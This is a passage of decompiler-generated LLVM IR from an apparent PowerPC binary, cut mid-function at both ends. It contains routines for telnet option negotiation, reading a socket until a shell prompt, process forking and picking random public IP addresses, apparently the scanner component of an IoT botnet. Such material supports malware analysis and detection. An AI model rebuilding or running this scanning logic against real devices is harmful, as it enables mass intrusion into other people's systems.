dec_label_pc_10002948:                            ; preds = %dec_label_pc_10002914
  br label %dec_label_pc_100029b0

dec_label_pc_10002954:                            ; preds = %dec_label_pc_10002898
  br label %dec_label_pc_100029b0

dec_label_pc_10002960:                            ; preds = %dec_label_pc_10002830
  br label %dec_label_pc_100029b0

dec_label_pc_1000296c:                            ; preds = %dec_label_pc_10002914, %dec_label_pc_100027f0
  store i32 268446080, i32* @lr, align 4
  %v2_1000297c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_1000298c = call i32 @__asm_rlwinm(i32 %v2_1000297c, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_100029a8.47 to i32), i32* @lr, align 4
  %v2_100029a4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_100029b0

dec_label_pc_100029b0:                            ; preds = %dec_label_pc_10002960, %dec_label_pc_10002954, %dec_label_pc_10002948, %dec_label_pc_100027e4, %dec_label_pc_1000296c
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_1000296c ], [ 0, %dec_label_pc_10002954 ], [ 0, %dec_label_pc_10002948 ], [ 0, %dec_label_pc_10002960 ], [ 0, %dec_label_pc_100027e4 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002884, { 1, 0 }
  uselistorder i32 %v2_10002854, { 1, 0, 2 }
  uselistorder i32 %v2_100027c4, { 1, 0 }
  uselistorder i32 %v1_100027ac, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_100029b0, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268446184, i32* @lr, align 4
  %v0_100029e4 = call i32 @__libc_fork()
  %v3_100029f4 = icmp eq i32 %v0_100029e4, 0
  br i1 %v3_100029f4, label %dec_label_pc_10002b78, label %dec_label_pc_10002a08

dec_label_pc_10002a08:                            ; preds = %entry
  %v3_10002a10 = load i32, i32* @global_var_1002e5f4.49, align 4
  %v2_10002a14 = load i32, i32* @global_var_1002e5f0.48, align 4
  %v1_10002a18 = add i32 %v3_10002a10, 1
  %v2_10002a18 = icmp eq i32 %v3_10002a10, -1
  %v2_10002a1c = zext i1 %v2_10002a18 to i32
  %v3_10002a1c = add i32 %v2_10002a1c, %v2_10002a14
  store i32 %v3_10002a1c, i32* @global_var_1002e5f0.48, align 4
  store i32 %v1_10002a18, i32* @global_var_1002e5f4.49, align 4
  %v1_10002a4c = mul i32 %v1_10002a18, 4
  %v1_10002a54 = add i32 %v1_10002a4c, 4
  store i32 %v1_10002a54, i32* @r3, align 4
  store i32 268446304, i32* @lr, align 4
  %v0_10002a5c = call i32 @malloc()
  br label %dec_label_pc_10002ab4

dec_label_pc_10002a74:                            ; preds = %dec_label_pc_10002ab4, %dec_label_pc_10002b04
  %v1_10002a78 = mul i32 %storemerge2, 4
  %v2_10002a84 = add i32 %v1_10002a78, %v0_10002a5c
  %v3_10002a98 = load i32, i32* @global_var_1002e61c.50, align 4
  %v2_10002a9c = add i32 %v3_10002a98, %v1_10002a78
  %v1_10002aa0 = inttoptr i32 %v2_10002a9c to i32*
  %v2_10002aa0 = load i32, i32* %v1_10002aa0, align 4
  %v2_10002aa4 = inttoptr i32 %v2_10002a84 to i32*
  store i32 %v2_10002aa0, i32* %v2_10002aa4, align 4
  %v1_10002aac = add i32 %storemerge2, 1
  br label %dec_label_pc_10002ab4

dec_label_pc_10002ab4:                            ; preds = %dec_label_pc_10002a08, %dec_label_pc_10002a74
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002a08 ], [ %v1_10002aac, %dec_label_pc_10002a74 ]
  %v3_10002adc = load i32, i32* @global_var_1002e5f4.49, align 4
  %v2_10002ae0 = load i32, i32* @global_var_1002e5f0.48, align 4
  %v2_10002ae4 = icmp ne i32 %v3_10002adc, 0
  %v3_10002ae8 = add i32 %v2_10002ae0, -1
  %v4_10002ae8 = sext i1 %v2_10002ae4 to i32
  %v3_10002afc = icmp eq i32 %v3_10002ae8, %v4_10002ae8
  br i1 %v3_10002afc, label %dec_label_pc_10002b04, label %dec_label_pc_10002a74

dec_label_pc_10002b04:                            ; preds = %dec_label_pc_10002ab4
  %v1_10002ae4 = add i32 %v3_10002adc, -1
  %v3_10002b1c = icmp ugt i32 %v1_10002ae4, %storemerge2
  br i1 %v3_10002b1c, label %dec_label_pc_10002a74, label %dec_label_pc_10002b24

dec_label_pc_10002b24:                            ; preds = %dec_label_pc_10002b04
  %v1_10002b38 = mul i32 %v3_10002adc, 4
  %v2_10002b44 = add i32 %v0_10002a5c, -4
  %v1_10002b48 = add i32 %v2_10002b44, %v1_10002b38
  %v2_10002b50 = inttoptr i32 %v1_10002b48 to i32*
  store i32 %v0_100029e4, i32* %v2_10002b50, align 4
  %v3_10002b58 = load i32, i32* @global_var_1002e61c.50, align 4
  store i32 %v3_10002b58, i32* @r3, align 4
  store i32 268446564, i32* @lr, align 4
  %v0_10002b60 = call i32 @free()
  store i32 %v0_10002a5c, i32* @global_var_1002e61c.50, align 4
  br label %dec_label_pc_10002b78

dec_label_pc_10002b78:                            ; preds = %entry, %dec_label_pc_10002b24
  ret i32 %v0_100029e4

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002a78, { 1, 0 }
  uselistorder i32 %v0_10002a5c, { 1, 2, 0 }
  uselistorder i32 %v3_10002a10, { 1, 0 }
  uselistorder label %dec_label_pc_10002b78, { 1, 0 }
  uselistorder label %dec_label_pc_10002ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10002a74, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002bbc = add i32 %arg2, 1
  %v1_10002bc0 = inttoptr i32 %v1_10002bbc to i8*
  %v2_10002bc0 = load i8, i8* %v1_10002bc0, align 1
  %v1_10002bd0 = icmp ult i8 %v2_10002bc0, -5
  br i1 %v1_10002bd0, label %dec_label_pc_10002d28, label %dec_label_pc_10002bd8

dec_label_pc_10002bd8:                            ; preds = %entry
  %v2_10002bdc = icmp eq i8 %v2_10002bc0, -1
  br i1 %v2_10002bdc, label %dec_label_pc_10002be4, label %dec_label_pc_10002c00

dec_label_pc_10002be4:                            ; preds = %dec_label_pc_10002bd8
  br label %dec_label_pc_10002d28

dec_label_pc_10002c00:                            ; preds = %dec_label_pc_10002bd8
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_10002c0c = ptrtoint i8* %stack_var_-56 to i32
  store i32 268446752, i32* @lr, align 4
  %v4_10002c1c = call i32 @__libc_send(i32 %arg1, i32 %v2_10002c0c, i32 1, i32 16384)
  %v2_10002c28 = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c30 = icmp eq i8 %v2_10002c28, -4
  br i1 %v3_10002c30, label %dec_label_pc_10002c38, label %dec_label_pc_10002c44

dec_label_pc_10002c38:                            ; preds = %dec_label_pc_10002c00
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002c44:                            ; preds = %dec_label_pc_10002c00
  %v2_10002c4c = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c54 = icmp eq i8 %v2_10002c4c, -2
  br i1 %v3_10002c54, label %dec_label_pc_10002c5c, label %dec_label_pc_10002c68

dec_label_pc_10002c5c:                            ; preds = %dec_label_pc_10002c44
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002c68:                            ; preds = %dec_label_pc_10002c44
  %v2_10002c70 = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c78 = icmp eq i8 %v2_10002c70, 3
  br i1 %v3_10002c78, label %dec_label_pc_10002c80, label %dec_label_pc_10002cb8

dec_label_pc_10002c80:                            ; preds = %dec_label_pc_10002c68
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002cb8:                            ; preds = %dec_label_pc_10002c68
  %v3_10002c90 = icmp eq i8 %v2_10002c70, -3
  %.7 = select i1 %v3_10002c90, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002cec:                            ; preds = %dec_label_pc_10002c80, %dec_label_pc_10002c5c, %dec_label_pc_10002c38, %dec_label_pc_10002cb8
  store i32 268446980, i32* @lr, align 4
  %v4_10002d00 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002c0c, i32 1, i32 16384)
  %v1_10002d08 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002d20.51 to i32), i32* @lr, align 4
  %v4_10002d1c = call i32 @__libc_send(i32 %arg1, i32 %v1_10002d08, i32 1, i32 16384)
  br label %dec_label_pc_10002d28

dec_label_pc_10002d28:                            ; preds = %dec_label_pc_10002be4, %dec_label_pc_10002cec, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002d28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002cec, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10002d74 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10013cc4.52 to i32), i32* @r3, align 4
  %v0_10002eb010 = call i32 @__GI_strlen()
  %v2_10002eb812 = icmp eq i32 %v0_10002eb010, 0
  br i1 %v2_10002eb812, label %dec_label_pc_10002ec8, label %dec_label_pc_10002da0.preheader.lr.ph

dec_label_pc_10002da0.preheader.lr.ph:            ; preds = %entry
  %v2_10002dbc = add i32 %v0_10002d74, %arg1
  br label %dec_label_pc_10002da0.preheader

dec_label_pc_10002d94:                            ; preds = %dec_label_pc_10002e28, %dec_label_pc_10002e00, %dec_label_pc_10002dd8, %dec_label_pc_10002db0
  %v1_10002d98 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002da8 = icmp sgt i32 %v0_10002d74, %v1_10002d98
  br i1 %v3_10002da8, label %dec_label_pc_10002db0, label %dec_label_pc_10002e50

dec_label_pc_10002db0:                            ; preds = %dec_label_pc_10002da0.preheader, %dec_label_pc_10002d94
  %stack_var_-40.08 = phi i32 [ %v1_10002d98, %dec_label_pc_10002d94 ], [ %stack_var_-40.115, %dec_label_pc_10002da0.preheader ]
  %v2_10002dc4 = sub i32 %v2_10002dbc, %stack_var_-40.08
  %v1_10002dc8 = inttoptr i32 %v2_10002dc4 to i8*
  %v2_10002dc8 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002dd0 = icmp eq i8 %v2_10002dc8, 0
  br i1 %v3_10002dd0, label %dec_label_pc_10002d94, label %dec_label_pc_10002dd8

dec_label_pc_10002dd8:                            ; preds = %dec_label_pc_10002db0
  %v2_10002df0 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002df8 = icmp eq i8 %v2_10002df0, 32
  br i1 %v3_10002df8, label %dec_label_pc_10002d94, label %dec_label_pc_10002e00

dec_label_pc_10002e00:                            ; preds = %dec_label_pc_10002dd8
  %v2_10002e18 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002e20 = icmp eq i8 %v2_10002e18, 13
  br i1 %v3_10002e20, label %dec_label_pc_10002d94, label %dec_label_pc_10002e28

dec_label_pc_10002e28:                            ; preds = %dec_label_pc_10002e00
  %v2_10002e40 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002e48 = icmp eq i8 %v2_10002e40, 10
  br i1 %v3_10002e48, label %dec_label_pc_10002d94, label %dec_label_pc_10002e50

dec_label_pc_10002e50:                            ; preds = %dec_label_pc_10002e28, %dec_label_pc_10002d94, %dec_label_pc_10002da0.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002da0.preheader ], [ %stack_var_-40.08, %dec_label_pc_10002e28 ], [ %v1_10002d98, %dec_label_pc_10002d94 ]
  %v2_10002e64 = sub i32 %v2_10002dbc, %stack_var_-40.0.lcssa
  %v1_10002e68 = inttoptr i32 %v2_10002e64 to i8*
  %v2_10002e68 = load i8, i8* %v1_10002e68, align 1
  %v2_10002e7c = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10013cc4.52 to i32)
  %v1_10002e80 = inttoptr i32 %v2_10002e7c to i8*
  %v2_10002e80 = load i8, i8* %v1_10002e80, align 1
  %v4_10002e88 = icmp eq i8 %v2_10002e68, %v2_10002e80
  br i1 %v4_10002e88, label %dec_label_pc_10002ec8, label %dec_label_pc_10002e9c

dec_label_pc_10002e9c:                            ; preds = %dec_label_pc_10002e50
  %v1_10002ea0 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10013cc4.52 to i32), i32* @r3, align 4
  %v0_10002eb0 = call i32 @__GI_strlen()
  %v2_10002eb8 = icmp ult i32 %v1_10002ea0, %v0_10002eb0
  br i1 %v2_10002eb8, label %dec_label_pc_10002da0.preheader, label %dec_label_pc_10002ec8

dec_label_pc_10002da0.preheader:                  ; preds = %dec_label_pc_10002da0.preheader.lr.ph, %dec_label_pc_10002e9c
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002da0.preheader.lr.ph ], [ %v1_10002ea0, %dec_label_pc_10002e9c ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002da0.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002e9c ]
  %v3_10002da86 = icmp sgt i32 %v0_10002d74, %stack_var_-40.115
  br i1 %v3_10002da86, label %dec_label_pc_10002db0, label %dec_label_pc_10002e50

dec_label_pc_10002ec8:                            ; preds = %entry, %dec_label_pc_10002e50, %dec_label_pc_10002e9c
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002e50 ], [ 0, %dec_label_pc_10002e9c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002ea0, { 1, 0 }
  uselistorder i32 %v0_10002d74, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10013cc4.52 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002ec8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002da0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002e50, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002f1c = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_1000315c5 = add i32 %v0_10002f1c, 2
  %v2_100031646 = icmp slt i32 %v1_1000315c5, %arg7
  br i1 %v2_100031646, label %dec_label_pc_1000316c.lr.ph, label %dec_label_pc_1000319c

dec_label_pc_1000316c.lr.ph:                      ; preds = %entry
  %v2_10002f54 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002f9c = udiv i32 %arg1, 32
  %v1_10002fa4 = mul nuw nsw i32 %v1_10002f9c, 4
  %v2_10002fa8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002fac = add nuw nsw i32 %v1_10002fa4, 24
  %v1_10002fb0 = add i32 %v2_10002fac, %v2_10002fa8
  %v1_10002fb4 = inttoptr i32 %v1_10002fb0 to i32*
  %v1_10002fbc = urem i32 %arg1, 32
  %v3_10002fc4 = shl i32 1, %v1_10002fbc
  %v1_10002fe4 = add i32 %arg1, 1
  %v2_10002fec = ptrtoint i32* %stack_var_-64 to i32
  %v4_1000311c = inttoptr i32 %arg2 to i8*
  %v3_10003130 = icmp eq i32 %arg3, 0
  %v2_1000317c = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_1000316c

dec_label_pc_10002f54:                            ; preds = %dec_label_pc_10003178, %dec_label_pc_1000316c
  store i32 %v2_10002f54, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge

dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge: ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge, %dec_label_pc_10002f54
  %v3_10002f6c.pre = phi i32 [ %v2_10002f54, %dec_label_pc_10002f54 ], [ %v3_10002f6c.pre.pre, %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge ]
  %v1_10002f8436 = phi i32 [ 1, %dec_label_pc_10002f54 ], [ %v1_10002f84, %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge ]
  %v1_10002f70 = mul nuw nsw i32 %v1_10002f8436, 4
  %v2_10002f74 = add i32 %v1_10002f70, %v3_10002f6c.pre
  %v2_10002f7c = inttoptr i32 %v2_10002f74 to i32*
  store i32 0, i32* %v2_10002f7c, align 4
  %v1_10002f84 = add nuw nsw i32 %v1_10002f8436, 1
  %tmp33 = icmp ult i32 %v1_10002f84, 32
  br i1 %tmp33, label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge, label %dec_label_pc_10002f98

dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge: ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge
  %v3_10002f6c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge

dec_label_pc_10002f98:                            ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge
  %v2_10002fb4 = load i32, i32* %v1_10002fb4, align 4
  %v2_10002fc8 = or i32 %v2_10002fb4, %v3_10002fc4
  store i32 %v2_10002fc8, i32* %v1_10002fb4, align 4
  store i32 268447752, i32* @lr, align 4
  %v5_10003004 = call i32 @__libc_select(i32 %v1_10002fe4, i32 %v2_10002f54, i32 0, i32 0, i32 %v2_10002fec)
  %tmp34 = icmp slt i32 %v5_10003004, 1
  br i1 %tmp34, label %dec_label_pc_1000319c, label %dec_label_pc_10003014

dec_label_pc_10003014:                            ; preds = %dec_label_pc_10002f98
  %v2_10003020 = add i32 %stack_var_-196.09, %arg6
  store i32 268447804, i32* @lr, align 4
  %v4_10003038 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10003020, i32 1, i32 0)
  %v4_1000304c = icmp eq i32 %v4_10003038, -1
  br i1 %v4_1000304c, label %dec_label_pc_10003060, label %dec_label_pc_10003054

dec_label_pc_10003054:                            ; preds = %dec_label_pc_10003014
  %v3_10003058 = icmp eq i32 %v4_10003038, 0
  br i1 %v3_10003058, label %dec_label_pc_10003060, label %dec_label_pc_1000306c

dec_label_pc_10003060:                            ; preds = %dec_label_pc_10003054, %dec_label_pc_10003014
  br label %dec_label_pc_100031a4

dec_label_pc_1000306c:                            ; preds = %dec_label_pc_10003054
  %v2_10003074 = add i32 %v4_10003038, %stack_var_-196.09
  %v4_1000307c = inttoptr i32 %v2_10003020 to i8*
  %v3_10003080 = load i8, i8* %v4_1000307c, align 1
  %v3_10003088 = icmp eq i8 %v3_10003080, -1
  br i1 %v3_10003088, label %dec_label_pc_10003090, label %dec_label_pc_10003114

dec_label_pc_10003090:                            ; preds = %dec_label_pc_1000306c
  %v1_10003094 = add i32 %v2_10003020, 1
  store i32 268447916, i32* @lr, align 4
  %v4_100030a8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10003094, i32 2, i32 0)
  %v4_100030bc = icmp eq i32 %v4_100030a8, -1
  br i1 %v4_100030bc, label %dec_label_pc_100030d0, label %dec_label_pc_100030c4

dec_label_pc_100030c4:                            ; preds = %dec_label_pc_10003090
  %v3_100030c8 = icmp eq i32 %v4_100030a8, 0
  br i1 %v3_100030c8, label %dec_label_pc_100030d0, label %dec_label_pc_100030dc

dec_label_pc_100030d0:                            ; preds = %dec_label_pc_100030c4, %dec_label_pc_10003090
  br label %dec_label_pc_100031a4

dec_label_pc_100030dc:                            ; preds = %dec_label_pc_100030c4
  %v2_100030e4 = add i32 %v4_100030a8, %v2_10003074
  store i32 268447996, i32* @lr, align 4
  %v4_100030f8 = call i32 @negotiate(i32 %arg1, i32 %v2_10003020, i32 3, i32 %v2_10003074)
  %v3_10003100 = icmp eq i32 %v4_100030f8, 0
  br i1 %v3_10003100, label %dec_label_pc_10003108, label %dec_label_pc_10003158.backedge

dec_label_pc_10003108:                            ; preds = %dec_label_pc_100030dc
  br label %dec_label_pc_100031a4

dec_label_pc_10003114:                            ; preds = %dec_label_pc_1000306c
  store i32 268448032, i32* @lr, align 4
  %v5_1000311c = call i32 @strstr(i32 %arg6, i8* %v4_1000311c, i32 %v2_10003020)
  %v3_10003124 = icmp eq i32 %v5_1000311c, 0
  br i1 %v3_10003124, label %dec_label_pc_1000312c, label %dec_label_pc_10003190

dec_label_pc_1000312c:                            ; preds = %dec_label_pc_10003114
  br i1 %v3_10003130, label %dec_label_pc_10003158.backedge, label %dec_label_pc_10003138

dec_label_pc_10003158.backedge:                   ; preds = %dec_label_pc_1000312c, %dec_label_pc_10003138, %dec_label_pc_100030dc
  %stack_var_-196.0.be = phi i32 [ %v2_100030e4, %dec_label_pc_100030dc ], [ %v2_10003074, %dec_label_pc_1000312c ], [ %v2_10003074, %dec_label_pc_10003138 ]
  %v1_1000315c = add i32 %stack_var_-196.0.be, 2
  %v2_10003164 = icmp slt i32 %v1_1000315c, %arg7
  br i1 %v2_10003164, label %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge, label %dec_label_pc_1000319c

dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge: ; preds = %dec_label_pc_10003158.backedge
  %v3_1000316c.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1000316c

dec_label_pc_10003138:                            ; preds = %dec_label_pc_1000312c
  %v1_1000313c = call i32 @matchPrompt(i32 %arg6)
  %v3_10003144 = icmp eq i32 %v1_1000313c, 0
  br i1 %v3_10003144, label %dec_label_pc_10003158.backedge, label %dec_label_pc_10003190

dec_label_pc_1000316c:                            ; preds = %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge, %dec_label_pc_1000316c.lr.ph
  %v3_1000316c = phi i32 [ %arg4, %dec_label_pc_1000316c.lr.ph ], [ %v3_1000316c.pre, %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002f1c, %dec_label_pc_1000316c.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge ]
  %v2_10003170 = icmp sgt i32 %v3_1000316c, 0
  br i1 %v2_10003170, label %dec_label_pc_10002f54, label %dec_label_pc_10003178

dec_label_pc_10003178:                            ; preds = %dec_label_pc_1000316c
  br i1 %v2_1000317c, label %dec_label_pc_10002f54, label %dec_label_pc_1000319c

dec_label_pc_10003190:                            ; preds = %dec_label_pc_10003114, %dec_label_pc_10003138
  br label %dec_label_pc_100031a4

dec_label_pc_1000319c:                            ; preds = %dec_label_pc_10003158.backedge, %dec_label_pc_10003178, %dec_label_pc_10002f98, %entry
  br label %dec_label_pc_100031a4

dec_label_pc_100031a4:                            ; preds = %dec_label_pc_10003190, %dec_label_pc_10003108, %dec_label_pc_100030d0, %dec_label_pc_10003060, %dec_label_pc_1000319c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000319c ], [ 1, %dec_label_pc_10003190 ], [ 0, %dec_label_pc_10003060 ], [ 0, %dec_label_pc_100030d0 ], [ 0, %dec_label_pc_10003108 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10003074, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002f84, { 1, 0 }
  uselistorder i32 %v2_10002f54, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_100031a4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000319c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10003190, { 1, 0 }
  uselistorder label %dec_label_pc_10003158.backedge, { 1, 0, 2 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i8 0, i8* @global_var_1002e601.54, align 1
  store i8 0, i8* @global_var_1002e602.55, align 1
  store i8 0, i8* @global_var_1002e603.56, align 1
  store i8 0, i8* @global_var_1002e604.57, align 1
  store i32 268448284, i32* @lr, align 4
  %v0_10003218 = call i32 @random()
  %v2_10003238 = srem i32 %v0_10003218, 255
  %v1_10003260 = trunc i32 %v2_10003238 to i8
  store i8 %v1_10003260, i8* @global_var_1002e601.54, align 1
  store i32 268448360, i32* @lr, align 4
  %v0_10003264 = call i32 @random()
  %v2_10003284 = srem i32 %v0_10003264, 255
  %v1_100032ac = trunc i32 %v2_10003284 to i8
  store i8 %v1_100032ac, i8* @global_var_1002e602.55, align 1
  store i32 268448436, i32* @lr, align 4
  %v0_100032b0 = call i32 @random()
  %v2_100032d0 = srem i32 %v0_100032b0, 255
  %v1_100032f8 = trunc i32 %v2_100032d0 to i8
  store i8 %v1_100032f8, i8* @global_var_1002e603.56, align 1
  store i32 268448512, i32* @lr, align 4
  %v0_100032fc = call i32 @random()
  %v2_1000331c = srem i32 %v0_100032fc, 255
  %v1_10003344 = trunc i32 %v2_1000331c to i8
  store i8 %v1_10003344, i8* @global_var_1002e604.57, align 1
  store i32 268448588, i32* @lr, align 4
  %v0_10003348 = call i32 @random()
  %v2_10003364 = srem i32 %v0_10003348, 115
  %v3_10003378 = icmp eq i32 %v2_10003364, 0
  br i1 %v3_10003378, label %dec_label_pc_10003380, label %dec_label_pc_100033c8

dec_label_pc_10003380:                            ; preds = %entry
  %v2_10003380 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003394 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003394 = zext i8 %v3_10003394 to i32
  %v4_100033c4 = call i32 @szprintf(i32 %v2_10003380, i32 ptrtoint ([13 x i8]* @global_var_10013ccc.58 to i32), i32 %v4_10003394)
  br label %dec_label_pc_100033c8

dec_label_pc_100033c8:                            ; preds = %entry, %dec_label_pc_10003380
  %v3_100033cc = icmp eq i32 %v2_10003364, 1
  br i1 %v3_100033cc, label %dec_label_pc_100033d4, label %dec_label_pc_1000341c

dec_label_pc_100033d4:                            ; preds = %dec_label_pc_100033c8
  %v2_100033d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100033e8 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_100033e8 = zext i8 %v3_100033e8 to i32
  %v4_10003418 = call i32 @szprintf(i32 %v2_100033d4, i32 ptrtoint ([13 x i8]* @global_var_10013cdc.59 to i32), i32 %v4_100033e8)
  br label %dec_label_pc_1000341c

dec_label_pc_1000341c:                            ; preds = %dec_label_pc_100033c8, %dec_label_pc_100033d4
  %v3_10003420 = icmp eq i32 %v2_10003364, 2
  br i1 %v3_10003420, label %dec_label_pc_10003428, label %dec_label_pc_10003470

dec_label_pc_10003428:                            ; preds = %dec_label_pc_1000341c
  %v2_10003428 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000343c = load i8, i8* @global_var_1002e603.56, align 1
  %v4_1000343c = zext i8 %v3_1000343c to i32
  %v4_1000346c = call i32 @szprintf(i32 %v2_10003428, i32 ptrtoint ([11 x i8]* @global_var_10013cec.60 to i32), i32 %v4_1000343c)
  br label %dec_label_pc_10003470

dec_label_pc_10003470:                            ; preds = %dec_label_pc_1000341c, %dec_label_pc_10003428
  %v3_10003474 = icmp eq i32 %v2_10003364, 3
  br i1 %v3_10003474, label %dec_label_pc_1000347c, label %dec_label_pc_100034c4

dec_label_pc_1000347c:                            ; preds = %dec_label_pc_10003470
  %v2_1000347c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003490 = load i8, i8* @global_var_1002e603.56, align 1
  %v4_10003490 = zext i8 %v3_10003490 to i32
  %v4_100034c0 = call i32 @szprintf(i32 %v2_1000347c, i32 ptrtoint ([13 x i8]* @global_var_10013cf8.61 to i32), i32 %v4_10003490)
  br label %dec_label_pc_100034c4

dec_label_pc_100034c4:                            ; preds = %dec_label_pc_10003470, %dec_label_pc_1000347c
  %v3_100034c8 = icmp eq i32 %v2_10003364, 4
  br i1 %v3_100034c8, label %dec_label_pc_100034d0, label %dec_label_pc_10003518

